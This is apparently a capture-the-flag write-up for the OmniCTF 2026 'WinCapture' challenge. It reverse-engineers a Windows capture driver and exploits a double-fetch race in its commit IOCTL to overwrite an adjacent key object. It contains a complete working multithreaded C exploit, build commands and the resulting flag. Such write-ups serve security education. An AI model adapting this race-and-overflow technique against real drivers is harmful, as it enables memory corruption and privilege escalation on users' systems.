@@ -1,0 +1,302 @@
+---
+title: 'OmniCTF 2026 - WinCapture'
+description: 'Winning a double-fetch race in a Windows capture driver, where the bump allocator alignment that blocks a single-threaded overflow becomes the thing that guarantees the corruption lands'
+date: 2026-08-09
+tags: ['writeup', 'pwn', 'race-condition', 'toctou', 'reverse-engineering', 'omnictf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+> A packet capture driver ships with PktTrack network tools. An internal audit flagged a race condition in the capture commit path. Management said the window is "too small to exploit in practice." Prove them wrong.
+>
+> ```text
+> Goal:
+>   1. Reverse WinCapture.sys to understand the IOCTL interface.
+>   2. Find and exploit the race condition in IOCTL_COMMIT_CAPTURE.
+>   3. Write exploit.exe (x64 Windows PE) that wins the race, corrupts the
+>      key object, and retrieves the flag.
+>   4. Send exploit.exe here -- the server runs it against a live WinCapture
+>      driver instance and returns the output.
+>
+> Driver interface:  \\.\pipe\WinCapture
+> ```
+
+We get `WinCapture.sys`. The exploit reaches the driver over a named pipe; a harness bridges pipe messages to the IOCTL dispatch and shares one driver instance across connections, which is what makes the race reachable at all.
+
+## Initial Analysis
+
+```text
+$ file WinCapture.sys
+WinCapture.sys: PE32+ executable (DLL) (native) x86-64 (stripped to external PDB), 7 sections
+
+$ strings WinCapture.sys
+...
+CTF{placH
+eholder_H
+set_at_rH
+untime}
+GCC: (GNU) 13-win32
+WinCapture.sys
+DriverEntry
+WinCaptureDeviceControl
+```
+
+Two things fall out. The flag in the binary is a placeholder built on the stack — the trailing `H` bytes are `REX.W` prefixes of the `movabs` instructions loading it as immediates — so the real flag comes from the server after a successful exploit. And the driver was built with MinGW GCC 13 with an empty `.idata`: it never calls `IoCreateDevice` or `ExAllocatePool`, managing everything inside a large static `.bss`. That makes it a self-contained module the harness can load and call directly.
+
+## Source Code Analysis
+
+`WinCaptureDeviceControl` is a standard `DeviceIoControl` handler over an IRP-like request object, dispatching through a jump table:
+
+```asm
+mov  edi, [rdx+0x80]              ; ioctl
+lea  edx, [rdi+0x3dffe000]        ; ioctl - 0xC2002000
+cmp  edx, 0x10
+ja   .invalid                     ; STATUS_INVALID_DEVICE_REQUEST
+lea  rcx, [rip+0xfbf]             ; jump table @ 0x12000
+movsxd rdx, [rcx+rdx*4]
+add  rdx, rcx
+jmp  rdx
+```
+
+The index is `ioctl - 0xC2002000` and only multiples of four hit real handlers:
+
+| IOCTL | Handler |
+| --- | --- |
+| `0xC2002000` | **STORE** — write a capture slot |
+| `0xC2002004` | **ALLOC_VALUE** — allocate value object B |
+| `0xC2002008` | **ALLOC_KEY** — allocate KEY object A |
+| `0xC200200C` | **COMMIT_CAPTURE** — copy slot into value |
+| `0xC2002010` | **GET_FLAG** — grant access |
+
+The `.bss` layout puts the two objects in a bump-allocated region:
+
+```text
+0x15000  key_ptr   (A, global)             ; magic 0x4b455901
+0x15008  value_size
+0x15010  value_ptr (B, global)
+0x15020  slots[4][0x1000]                  ; 4 fixed capture buffers
+0x19020  slot_sizes[4]  (u32 each)
+0x19030  heap_off       (bump pointer)
+0x19040  heap[0x10000]  (bump allocator)
+```
+
+STORE takes the size straight from the input and never validates it:
+
+```c
+// input: [u32 slot][u32 size][0x1000 bytes]  (in_len must be > 0x1007)
+if (slot > 3) fail;
+slot_sizes[slot] = size;                 // ATTACKER-CONTROLLED, unvalidated here
+memcpy(&slots[slot], input+8, 0x1000);   // fixed 0x1000-byte copy
+```
+
+Both allocations are one-shot, and the key is created locked:
+
+```c
+// ALLOC_VALUE: input [u32 size], 1 <= size <= 0x200
+if (value_ptr != NULL) fail;
+value_ptr  = bump_alloc(align16(size));
+value_size = size;
+
+// ALLOC_KEY
+if (key_ptr != NULL) fail;
+key_ptr = bump_alloc(0x10);
+*(u64*)key_ptr = 0x4b455901;             // magic in [0..4], field_4 in [4..8] = 0
+```
+
+GET_FLAG defines the win condition:
+
+```c
+A = key_ptr;
+if (!A)                       fail;
+if (*(u32*)A != 0x4b455901)   fail;      // magic
+if (*(u32*)(A+4) == 0)        fail;      // field_4 must be non-zero
+if (out_len < 0x80)           fail(STATUS_BUFFER_TOO_SMALL);
+write_flag(out);                          // access granted
+```
+
+So the entire game is making `field_4` non-zero while keeping the magic intact.
+
+## The Vulnerability
+
+COMMIT_CAPTURE reads `slot_size` **twice**:
+
+```asm
+mov  edx, slot_sizes[slot]        ; (T1) read #1
+cmp  value_size, edx
+jb   .fail                        ; require value_size >= slot_size
+call checksum                     ; a few cycles of window
+mov  rcx, value_ptr               ; dest = B
+mov  edx, slot_sizes[slot]        ; (T2) read #2  <-- RE-READ
+mov  r8d, 0x1000
+cmp  edx, r8d
+cmova rdx, r8                     ; len = min(slot_size, 0x1000)
+```
+
+Single-threaded, nothing here is exploitable. `value_size` is at most `0x200`, the check forces `slot_size` no larger than `value_size`, and the copy length is bounded by the same value. Because the bump allocator 16-byte-aligns every chunk, the KEY object A always sits at `B + align16(value_size)` — exactly at or past the end of B's chunk — so a copy of at most `value_size` bytes fills B and stops just short of A. The alignment is what guards `field_4`.
+
+The double fetch breaks that guarantee, because the value that was validated and the value that is used are two different reads:
+
+1. Thread T reaches the check at T1 while `slot_size` is `0x10`, no larger than `value_size` of `0x10`, so it passes.
+2. Another thread flips `slot_size` to `0x1000` with a STORE.
+3. Thread T reaches T2, re-reads `0x1000`, and copies `0x1000` bytes into the `0x10`-byte buffer.
+
+That write starts at B and runs straight through A, overwriting the magic along with `field_4`. So the source data has to *rebuild* a valid key rather than just corrupt one — and the same alignment that used to be the guard now works in our favour. A is 16-aligned relative to B, so filling the whole slot with a 16-byte-periodic pattern means every possible landing offset reconstructs a valid unlocked key:
+
+```text
+01 59 45 4b   41 41 41 41   00 00 00 00   00 00 00 00
+└ magic ┘     └ field_4 ┘
+0x4b455901    != 0
+```
+
+## Recovering the pipe wire format
+
+The pipe protocol belongs to the harness, which we do not have — but the server runs our binary and returns its stdout, which makes it a usable oracle. A probe that tries several framings on fresh connections settles it quickly.
+
+The response framing was obvious from the first reply (`0d 00 00 c0 | 00 00 00 00`, i.e. status `0xC000000D` with zero info). For the request:
+
+```text
+=== framing 1: [ioctl][inlen][outlen]+in ===   ALLOCV status=0xc000000d   (FAIL)
+=== framing 2: [ioctl][outlen][inlen]+in ===   ALLOCV status=0xc000000d   (FAIL)
+=== framing 3: [ioctl][inlen]+in         ===   ALLOCV status=0x00000000   (OK!)
+                                               ALLOCK status=0x00000000   (OK!)
+                                               GETFLAG status=0xc0000022   (field_4==0)
+=== framing 4: [u64 ioctl][u64 inlen]... ===   ALLOCV status=0xc000000d   (FAIL)
+```
+
+Requests are `[u32 ioctl][u32 in_len][in_len bytes]` with no output-length field, and responses are `[u32 status][u32 info][info bytes]`. GET_FLAG returning `0xC0000022` — the `field_4` denial — rather than `0xC0000023` for buffer-too-small also confirms the harness passes a default output length of at least `0x80`, so the only remaining obstacle really is `field_4`.
+
+## Exploitation
+
+Allocate the value then the key so A lands immediately after B, store the periodic payload, then run flipper threads toggling `slot_size` against committer threads spamming the commit path, polling GET_FLAG until it grants:
+
+```c
+/* WinCapture race-condition exploit
+ * Request : [u32 ioctl][u32 in_len][input]
+ * Response: [u32 status][u32 info][info bytes]
+ */
+#include <windows.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <string.h>
+
+#define PIPE_NAME "\\\\.\\pipe\\WinCapture"
+#define IO_STORE   0xC2002000u
+#define IO_ALLOCV  0xC2002004u
+#define IO_ALLOCK  0xC2002008u
+#define IO_COMMIT  0xC200200Cu
+#define IO_GETFLAG 0xC2002010u
+
+static volatile LONG   g_done = 0;
+static volatile LONG64 g_commits = 0, g_flips = 0;
+static uint8_t g_payload[0x1000];
+
+static HANDLE open_pipe(void){
+    for(int i=0;i<200;i++){
+        HANDLE h=CreateFileA(PIPE_NAME,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
+        if(h!=INVALID_HANDLE_VALUE){DWORD m=PIPE_READMODE_BYTE;SetNamedPipeHandleState(h,&m,NULL,NULL);return h;}
+        if(GetLastError()==ERROR_PIPE_BUSY){WaitNamedPipeA(PIPE_NAME,2000);continue;}
+        Sleep(5);
+    }
+    return INVALID_HANDLE_VALUE;
+}
+static int wr(HANDLE h,const void*b,DWORD n){const char*p=b;DWORD o=0,w;while(o<n){if(!WriteFile(h,p+o,n-o,&w,NULL)||!w)return 0;o+=w;}return 1;}
+static DWORD rd(HANDLE h,void*b,DWORD want,DWORD tmo){
+    char*p=b;DWORD got=0,waited=0;
+    while(got<want){
+        DWORD av=0; if(!PeekNamedPipe(h,NULL,0,NULL,&av,NULL))return got;
+        if(!av){ if(waited>=tmo)return got; Sleep(1);waited++;continue; }
+        DWORD t=want-got; if(t>av)t=av; DWORD r=0;
+        if(!ReadFile(h,p+got,t,&r,NULL)||!r)return got; got+=r;
+    }
+    return got;
+}
+/* one request/response; request framing = [ioctl][inlen][input] */
+static int io(HANDLE h,uint32_t code,const void*in,uint32_t inlen,uint32_t*st,uint32_t*inf,void*out,uint32_t outcap){
+    uint8_t buf[0x1010]; uint8_t*req=buf; uint32_t rl=8+inlen; uint8_t*heap=NULL;
+    if(rl>sizeof(buf)){heap=malloc(rl);req=heap;}
+    memcpy(req,&code,4); memcpy(req+4,&inlen,4); if(inlen)memcpy(req+8,in,inlen);
+    int ok=wr(h,req,rl); if(heap)free(heap); if(!ok)return 0;
+    uint8_t rh[8]; if(rd(h,rh,8,3000)<8){if(st)*st=0xDEAD0001;return 0;}
+    uint32_t s,f; memcpy(&s,rh,4); memcpy(&f,rh+4,4); if(st)*st=s; if(inf)*inf=f;
+    if(f){uint32_t t=f>outcap?outcap:f; rd(h,out,t,3000);
+          if(f>t){uint8_t tmp[256];uint32_t rem=f-t;while(rem){uint32_t c=rem>256?256:rem;DWORD g=rd(h,tmp,c,1000);if(!g)break;rem-=g;}}}
+    return 1;
+}
+static void build_payload(void){
+    for(int i=0;i<0x1000;i+=16){
+        g_payload[i+0]=0x01;g_payload[i+1]=0x59;g_payload[i+2]=0x45;g_payload[i+3]=0x4b; /* magic 0x4b455901 */
+        g_payload[i+4]=0x41;g_payload[i+5]=0x41;g_payload[i+6]=0x41;g_payload[i+7]=0x41; /* field_4 != 0    */
+        memset(&g_payload[i+8],0,8);
+    }
+}
+static uint32_t store_buf(uint8_t*b,uint32_t slot,uint32_t size){
+    memcpy(b,&slot,4); memcpy(b+4,&size,4); memcpy(b+8,g_payload,0x1000); return 8+0x1000;
+}
+static DWORD WINAPI flipper(LPVOID a){(void)a;
+    HANDLE h=open_pipe(); if(h==INVALID_HANDLE_VALUE)return 0; uint8_t b[0x1010]; uint32_t s,f;
+    while(!g_done){
+        io(h,IO_STORE,b,store_buf(b,0,0x1000),&s,&f,NULL,0);  /* big  -> overflow copy */
+        io(h,IO_STORE,b,store_buf(b,0,0x10),  &s,&f,NULL,0);  /* small-> passes check   */
+        InterlockedAdd64(&g_flips,2);
+    }
+    CloseHandle(h); return 0;
+}
+static DWORD WINAPI committer(LPVOID a){(void)a;
+    HANDLE h=open_pipe(); if(h==INVALID_HANDLE_VALUE)return 0; uint32_t slot=0,s,f;
+    while(!g_done){ io(h,IO_COMMIT,&slot,4,&s,&f,NULL,0); InterlockedIncrement64(&g_commits); }
+    CloseHandle(h); return 0;
+}
+static int getflag(HANDLE h){
+    uint8_t out[0x200]; uint32_t s=0,f=0; memset(out,0,sizeof(out));
+    if(!io(h,IO_GETFLAG,NULL,0,&s,&f,out,sizeof(out)))return 0;
+    if(s==0 && f>=4){ printf("[+] GET_FLAG granted: %.*s\n",(int)f,(char*)out); return 1; }
+    return 0;
+}
+int main(void){
+    setvbuf(stdout,NULL,_IONBF,0); build_payload();
+    HANDLE h=open_pipe(); if(h==INVALID_HANDLE_VALUE){printf("[-] no pipe\n");return 1;}
+    uint32_t s,f; uint8_t o[64]; uint32_t v=0x10; uint8_t sb[0x1010];
+    io(h,IO_ALLOCV,&v,4,&s,&f,o,sizeof(o));                 printf("[*] ALLOCV=%08x\n",s);
+    io(h,IO_ALLOCK,NULL,0,&s,&f,o,sizeof(o));               printf("[*] ALLOCK=%08x\n",s);
+    io(h,IO_STORE,sb,store_buf(sb,0,0x10),&s,&f,o,sizeof(o));printf("[*] STORE =%08x\n",s);
+
+    HANDLE th[24]; int nt=0;
+    for(int i=0;i<4;i++)  th[nt++]=CreateThread(NULL,0,flipper,NULL,0,NULL);
+    for(int i=0;i<12;i++) th[nt++]=CreateThread(NULL,0,committer,NULL,0,NULL);
+
+    int won=0; DWORD t0=GetTickCount();
+    while(GetTickCount()-t0<40000){ Sleep(150); if(getflag(h)){won=1;break;} }
+    InterlockedExchange(&g_done,1);
+    printf("[*] done won=%d commits=%lld flips=%lld\n",won,(long long)g_commits,(long long)g_flips);
+    return won?0:2;
+}
+```
+
+Cross-compiled without root by unpacking the MinGW-w64 debs locally:
+
+```bash
+apt-get download gcc-mingw-w64-x86-64-win32 gcc-mingw-w64-base \
+                 binutils-mingw-w64-x86-64 mingw-w64-common mingw-w64-x86-64-dev
+for d in *.deb; do dpkg-deb -x "$d" mingw_root/; done
+mingw_root/usr/bin/x86_64-w64-mingw32-gcc-win32 -O2 -static -s exploit.c -o exploit.exe
+```
+
+The race was won at about 37.6 seconds, after roughly 65k commits and 37k flips:
+
+```text
+[?] GETFLAG status=0 info=26 buf=WINCAPTURE_ACCESS_GRANTED
+...
+[+] Exploit verified. Team-bound flag:
+```
+
+The audit note in the banner was right that the window is only a few cycles wide — and irrelevant, because nothing stops us from retrying it tens of thousands of times a second.
+
+## Flag
+
+```text
+OmniCTF{d1_d2480b2b5201eb39_4d97c0090ca264950add6589b2dac19d_0388c290958a17f432917dc54ebc0c18}
+```
+
+The flag is team-bound, so the value above is the one issued to my session.
